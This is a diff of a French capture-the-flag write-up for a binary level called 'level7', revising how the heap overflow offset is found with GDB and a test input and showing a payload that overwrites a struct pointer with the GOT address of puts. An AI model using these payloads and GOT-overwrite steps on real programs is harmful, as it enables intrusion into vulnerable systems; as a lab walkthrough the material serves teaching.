@@ -75,17 +75,74 @@ objdump -R level7 | grep puts
 # 08049928 R_386_JUMP_SLOT   puts
 ```
 
-### 4. Calculer l'offset
+### 4. Déterminer l'offset
 
-**Layout du heap** :
-```
-0x0804a018  Buffer A (8 bytes)        ← strcpy(argv[1]) écrit ici
-0x0804a020  Header Struct B (8 bytes)
-0x0804a028  struct_b[0] (4 bytes)
-0x0804a02c  struct_b[1] (4 bytes)     ← CIBLE !
+**Ne jamais assumer l'offset, toujours le vérifier !**
+
+#### Méthode 1 : GDB + Examine heap (recommandée)
+
+```bash
+gdb level7
+
+# Breakpoint sur strcpy pour s'arrêter avant le crash
+(gdb) break strcpy
+Breakpoint 1 at 0x80483e0
+
+(gdb) run a b
+# Arguments courts, s'arrête au premier strcpy
+
+# Examiner la structure du heap
+(gdb) x/60wx 0x0804a000
+0x804a000:  0x00000000  0x00000011  0x00000001  0x0804a018  ← Struct A
+0x804a010:  0x00000000  0x00000011  0x00000000  0x00000000  ← Buffer A
+0x804a020:  0x00000000  0x00000011  0x00000002  0x0804a038  ← Struct B
+            ^^^^^^^^^^^                         ^^^^^^^^^^
+            Header                              struct_b[1] (CIBLE)
+0x804a030:  0x00000000  0x00000011  0x00000000  0x00000000  ← Buffer B
+
+# Identifier les adresses
+# Buffer A commence à   : 0x0804a018
+# struct_b[1] est à     : 0x0804a02c (ligne 3, 4ème valeur)
+# Offset = 0x02c - 0x018 = 0x14 = 20 bytes ✅
 ```
 
-**Offset = 20 bytes** (8 + 8 + 4)
+#### Méthode 2 : Test empirique
+
+```bash
+./level7 $(python -c 'print "A"*20 + "BBBB"') test
+# Segfault avec adresse 0x42424242 → offset = 20 ✅
+```
+
+**Offset confirmé : 20 bytes**
+
+#### Vérification visuelle de l'overflow (optionnel)
+
+**AVANT** :
+```bash
+gdb level7
+(gdb) break strcpy
+(gdb) run a b
+(gdb) x/4wx 0x0804a020
+0x804a020:  0x00000000  0x00000011  0x00000002  0x0804a038
+                                                ^^^^^^^^^^
+                                                struct_b[1] = Buffer B
+```
+
+**APRÈS** :
+```bash
+gdb level7
+(gdb) break strcpy
+(gdb) run $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
+(gdb) continue  # 2ème strcpy
+(gdb) x/4wx 0x0804a020
+0x804a020:  0x41414141  0x41414141  0x41414141  0x08049928
+                                                ^^^^^^^^^^
+                                                struct_b[1] = GOT puts ! ✅
+```
+
+**Changement visible** : `0x0804a038` → `0x08049928` ✅
+
+---
 
 ### 5. Construction des payloads
 
